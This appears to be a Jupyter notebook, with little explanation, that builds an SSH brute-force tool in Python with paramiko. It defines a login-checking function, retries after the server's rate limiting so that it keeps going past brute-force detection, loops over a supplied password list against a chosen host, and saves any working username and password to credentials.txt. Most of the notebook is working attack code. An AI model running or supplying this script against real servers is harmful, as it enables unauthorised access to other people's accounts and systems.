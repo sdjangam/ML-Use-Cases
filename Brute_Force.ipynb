{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## **Brute Force**\n",
    "Brute Force Algorithms are exactly what they sound like – straightforward methods of solving a problem that rely on sheer computing power and trying every possibility rather than advanced techniques to improve efficiency. ... Since you can't remember any of the digits, you have to use a brute force method to open the lock."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Requirement already satisfied: paramiko in c:\\users\\jgaur\\anaconda3\\lib\\site-packages (2.7.2)\n",
      "Requirement already satisfied: bcrypt>=3.1.3 in c:\\users\\jgaur\\anaconda3\\lib\\site-packages (from paramiko) (3.2.0)\n",
      "Requirement already satisfied: cryptography>=2.5 in c:\\users\\jgaur\\anaconda3\\lib\\site-packages (from paramiko) (3.1.1)\n",
      "Requirement already satisfied: pynacl>=1.0.1 in c:\\users\\jgaur\\anaconda3\\lib\\site-packages (from paramiko) (1.4.0)\n",
      "Requirement already satisfied: six>=1.4.1 in c:\\users\\jgaur\\anaconda3\\lib\\site-packages (from bcrypt>=3.1.3->paramiko) (1.15.0)\n",
      "Requirement already satisfied: cffi>=1.1 in c:\\users\\jgaur\\anaconda3\\lib\\site-packages (from bcrypt>=3.1.3->paramiko) (1.14.5)\n",
      "Requirement already satisfied: pycparser in c:\\users\\jgaur\\anaconda3\\lib\\site-packages (from cffi>=1.1->bcrypt>=3.1.3->paramiko) (2.20)\n"
     ]
    }
   ],
   "source": [
    "!pip3 install paramiko "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Requirement already satisfied: colorama in c:\\users\\jgaur\\anaconda3\\lib\\site-packages (0.4.4)\n"
     ]
    }
   ],
   "source": [
    "!pip3 install colorama"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "import paramiko\n",
    "import socket\n",
    "import time\n",
    "from colorama import init, Fore"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [],
   "source": [
    "# initialize colorama\n",
    "init()\n",
    "\n",
    "GREEN = Fore.GREEN\n",
    "RED   = Fore.RED\n",
    "RESET = Fore.RESET\n",
    "BLUE  = Fore.BLUE"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### **Now let's build a function that given hostname, username, and password, it tells us whether the combination is correct:**"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [],
   "source": [
    "def is_ssh_open(hostname, username, password):\n",
    "    # initialize SSH client\n",
    "    client = paramiko.SSHClient()\n",
    "    # add to know hosts\n",
    "    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n",
    "    try:\n",
    "        client.connect(hostname=hostname, username=username, password=password, timeout=3)\n",
    "    except socket.timeout:\n",
    "        # this is when host is unreachable\n",
    "        print(f\"{RED}[!] Host: {hostname} is unreachable, timed out.{RESET}\")\n",
    "        return False\n",
    "    except paramiko.AuthenticationException:\n",
    "        print(f\"[!] Invalid credentials for {username}:{password}\")\n",
    "        return False\n",
    "    except paramiko.SSHException:\n",
    "        print(f\"{BLUE}[*] Quota exceeded, retrying with delay...{RESET}\")\n",
    "        # sleep for a minute\n",
    "        time.sleep(60)\n",
    "        return is_ssh_open(hostname, username, password)\n",
    "    else:\n",
    "        # connection was established successfully\n",
    "        print(f\"{GREEN}[+] Found combo:\\n\\tHOSTNAME: {hostname}\\n\\tUSERNAME: {username}\\n\\tPASSWORD: {password}{RESET}\")\n",
    "        return True"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### **Finally, we try to connect to the SSH server and authenticate to it using client.connect() method with 3 seconds of a timeout, this method raises:**\n",
    "\n",
    "1. `socket.timeout`: when the host is unreachable during the 3 seconds.\n",
    "2. `paramiko.AuthenticationException`: when the username and password combination is incorrect.\n",
    "3. `paramiko.SSHException`: when a lot of logging attempts were performed in a short period of time, in other words, the server detects it is some kind of brute-force, we will know that and sleep for a minute and recursively call the function again with the same parameters."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [],
   "source": [
    "import argparse\n",
    "parser = argparse.ArgumentParser(description=\"SSH Bruteforce Python script.\")\n",
    "parser.add_argument(\"host\", help=\"Hostname or IP Address of SSH Server to bruteforce.\")\n",
    "parser.add_argument(\"-P\", \"--passlist\", help=\"File that contain password list in each line.\")\n",
    "parser.add_argument(\"-u\", \"--user\", help=\"Host username.\")\n",
    "\n",
    "# parse passed arguments\n",
    "args = parser.parse_args()\n",
    "host = args.host\n",
    "passlist = args.passlist\n",
    "user = args.user\n",
    "# read the file\n",
    "passlist = open(passlist).read().splitlines()\n",
    "# brute-force\n",
    "for password in passlist:\n",
    "    if is_ssh_open(host, user, password):\n",
    "        # if combo is valid, save it to a file\n",
    "        open(\"credentials.txt\", \"w\").write(f\"{user}@{host}:{password}\")\n",
    "        break"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
